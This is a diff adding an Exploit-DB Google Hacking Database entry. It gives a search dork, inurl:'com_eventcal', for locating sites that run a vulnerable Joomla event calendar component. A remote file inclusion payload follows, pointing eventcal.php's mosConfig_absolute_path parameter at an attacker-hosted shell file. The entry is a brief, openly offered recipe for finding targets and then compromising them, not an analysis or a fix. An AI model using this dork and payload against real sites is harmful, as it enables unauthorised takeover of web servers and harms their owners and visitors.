@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/3663
+Category:         Advisories and Vulnerabilities
+Published Date:   2011-01-02
+Author:           anonymous
+GoogleDork:       inurl:"com_eventcal"
+Description:      inurl:"com_eventcal"
+
+
+Author : AtT4CKxT3rR0r1ST [F.Hack@w.cn] RFI: www.site.com/components/com_eventcal/eventcal.php?mosConfig_absolute_path=[shell.txt?]
